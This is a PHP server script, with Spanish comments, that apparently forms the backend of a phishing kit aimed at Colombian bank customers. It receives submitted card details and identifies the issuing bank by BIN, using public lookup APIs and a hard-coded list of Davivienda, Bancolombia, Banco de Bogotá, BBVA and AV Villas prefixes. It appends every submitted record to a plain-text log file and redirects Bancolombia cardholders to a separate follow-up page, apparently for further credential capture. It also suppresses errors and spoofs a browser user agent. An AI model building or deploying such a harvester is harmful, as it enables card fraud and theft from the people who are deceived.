<?php
error_reporting(0);
ini_set('display_errors', 0);

header('Content-Type: application/json; charset=utf-8');

// CONFIGURACIÓN DE PROVEEDOR DE BIN
// Opciones: 'binlist', 'bincodes', 'fraudlabspro'
define('BIN_PROVIDER', 'binlist');

// CLAVES DE API (Rellenar si se usa bincodes o fraudlabspro)
define('BINCODES_API_KEY', 'YOUR_BINCODES_API_KEY');
define('FRAUDLABSPRO_API_KEY', 'YOUR_FRAUDLABSPRO_API_KEY');

// Obtener datos del cuerpo del POST
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!$data || !isset($data['cardNumber'])) {
    http_response_code(400);
    echo json_encode(array('status' => 'error', 'message' => 'No se recibieron datos válidos o falta el número de tarjeta.'));
    exit;
}

$cardNumber = preg_replace('/\s+/', '', $data['cardNumber']);
$bin = substr($cardNumber, 0, 6);

$issuer = 'Desconocido';
$scheme = 'Desconocido';

// Base de datos de BINs locales para bancos de Colombia
$localBins = array(
    // Davivienda
    '400135' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '401676' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '404179' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '444376' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '444300' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '444301' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '444302' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '444303' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '444304' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '444305' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '444306' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '444307' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '444308' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '444309' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '459321' => array('bank' => 'Davivienda', 'scheme' => 'Visa'),
    '516139' => array('bank' => 'Davivienda', 'scheme' => 'MasterCard'),
    '522216' => array('bank' => 'Davivienda', 'scheme' => 'MasterCard'),
    '530592' => array('bank' => 'Davivienda', 'scheme' => 'MasterCard'),
    '540751' => array('bank' => 'Davivienda', 'scheme' => 'MasterCard'),
    '554522' => array('bank' => 'Davivienda', 'scheme' => 'MasterCard'),
    
    // Bancolombia
    '411111' => array('bank' => 'Bancolombia', 'scheme' => 'Visa'),
    '422474' => array('bank' => 'Bancolombia', 'scheme' => 'Visa'),
    '425837' => array('bank' => 'Bancolombia', 'scheme' => 'Visa'),
    '491567' => array('bank' => 'Bancolombia', 'scheme' => 'Visa'),
    '519911' => array('bank' => 'Bancolombia', 'scheme' => 'MasterCard'),
    '524708' => array('bank' => 'Bancolombia', 'scheme' => 'MasterCard'),
    '530699' => array('bank' => 'Bancolombia', 'scheme' => 'MasterCard'),
    '540698' => array('bank' => 'Bancolombia', 'scheme' => 'MasterCard'),
    '552636' => array('bank' => 'Bancolombia', 'scheme' => 'MasterCard'),

    // Banco de Bogotá
    '403212' => array('bank' => 'Banco de Bogotá', 'scheme' => 'Visa'),
    '405230' => array('bank' => 'Banco de Bogotá', 'scheme' => 'Visa'),
    '459490' => array('bank' => 'Banco de Bogotá', 'scheme' => 'Visa'),
    '525381' => array('bank' => 'Banco de Bogotá', 'scheme' => 'MasterCard'),
    '530514' => array('bank' => 'Banco de Bogotá', 'scheme' => 'MasterCard'),
    '541203' => array('bank' => 'Banco de Bogotá', 'scheme' => 'MasterCard'),

    // BBVA
    '410260' => array('bank' => 'BBVA', 'scheme' => 'Visa'),
    '491522' => array('bank' => 'BBVA', 'scheme' => 'Visa'),
    '491583' => array('bank' => 'BBVA', 'scheme' => 'Visa'),
    '525686' => array('bank' => 'BBVA', 'scheme' => 'MasterCard'),
    '548906' => array('bank' => 'BBVA', 'scheme' => 'MasterCard'),

    // AV Villas
    '402845' => array('bank' => 'AV Villas', 'scheme' => 'Visa'),
    '459346' => array('bank' => 'AV Villas', 'scheme' => 'Visa'),
    '520141' => array('bank' => 'AV Villas', 'scheme' => 'MasterCard'),
    '521191' => array('bank' => 'AV Villas', 'scheme' => 'MasterCard'),
);

$binVerificado = false;

// 1. CONSULTAR EL BIN EN TIEMPO REAL Y DE FORMA AUTOMÁTICA
if (BIN_PROVIDER === 'bincodes' && BINCODES_API_KEY !== 'YOUR_BINCODES_API_KEY') {
    // Proveedor BinCodes
    $url = "https://api.bincodes.com/bin/?format=json&api_key=" . urlencode(BINCODES_API_KEY) . "&bin=" . urlencode($bin);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if ($response) {
        $result = json_decode($response, true);
        if (isset($result['bank']) && !empty($result['bank'])) {
            $issuer = $result['bank'];
            $binVerificado = true;
        }
        if (isset($result['card']) && !empty($result['card'])) {
            $scheme = $result['card'];
        }
    }
} elseif (BIN_PROVIDER === 'fraudlabspro' && FRAUDLABSPRO_API_KEY !== 'YOUR_FRAUDLABSPRO_API_KEY') {
    // Proveedor FraudLabs Pro BIN Lookup API
    $url = "https://api.fraudlabspro.com/v1/bin/lookup?key=" . urlencode(FRAUDLABSPRO_API_KEY) . "&bin=" . urlencode($bin) . "&format=json";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if ($response) {
        $result = json_decode($response, true);
        if (isset($result['card_issuing_bank']) && !empty($result['card_issuing_bank'])) {
            $issuer = $result['card_issuing_bank'];
            $binVerificado = true;
        }
        if (isset($result['card_brand']) && !empty($result['card_brand'])) {
            $scheme = $result['card_brand'];
        }
    }
} else {
    // Proveedor por defecto: binlist.net (automático, público y gratuito)
    $url = "https://lookup.binlist.net/" . urlencode($bin);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
    // User-agent simulado para evitar bloqueos por cabecera vacía
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    ));
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode === 200 && $response) {
        $result = json_decode($response, true);
        if (isset($result['bank']['name']) && !empty($result['bank']['name'])) {
            $issuer = $result['bank']['name'];
            $binVerificado = true;
        }
        if (isset($result['scheme']) && !empty($result['scheme'])) {
            $scheme = $result['scheme'];
        }
    }
}

// 2. FALLBACK A DICCIONARIO LOCAL SI LA CONSULTA AUTOMÁTICA DE API FALLÓ O SUPERÓ LÍMITES
if (!$binVerificado) {
    if (isset($localBins[$bin])) {
        $issuer = $localBins[$bin]['bank'];
        $scheme = $localBins[$bin]['scheme'];
    }
}

// 2. ACTUALIZAR LOS DATOS PARA EL LOG Y RESPUESTA
$data['bank'] = $issuer;
$data['type'] = $scheme;

// 3. GUARDAR EL LOG EN EL ARCHIVO LOCAL (Igual que loadtiketid.php)
$logFile = dirname(__DIR__, 2) . '/registro_tarjetas.txt';
$logData = "[" . date('Y-m-d H:i:s') . "] " . json_encode($data, JSON_UNESCAPED_UNICODE) . PHP_EOL;
@file_put_contents($logFile, $logData, FILE_APPEND);

// 4. DETERMINAR EL TIPO DE TARJETA SEGÚN EL PRIMER DÍGITO
$firstDigit = $cardNumber[0];
$cardType = 'Desconocido';
switch ($firstDigit) {
    case '4':
        $cardType = 'Visa';
        break;
    case '5':
        $cardType = 'MasterCard';
        break;
    case '3':
        $cardType = 'American Express';
        break;
    case '6':
        $cardType = 'Discover';
        break;
}

// 5. DETERMINAR LA DIRECCIÓN DE REDIRECCIÓN SEGÚN EL BANCO DETECTADO
$bancoNormalizado = strtolower($issuer);
$redirectUrl = 'dinadatos/id.html';

// Excepción: Redirigir a bancolombia si el banco lo contiene y no es nequi
if (strpos($bancoNormalizado, 'bancolombia') !== false && strpos($bancoNormalizado, 'bancolombia s.a.- nequi') === false) {
    $redirectUrl = 'dinadatos/bancol/index.php';
}

// 6. ENVIAR LA RESPUESTA JSON DE ÉXITO
echo json_encode(array(
    'status' => 'success',
    'bank' => $issuer,
    'cardType' => $cardType,
    'type' => $scheme,
    'redirect' => $redirectUrl
), JSON_UNESCAPED_UNICODE);
?>
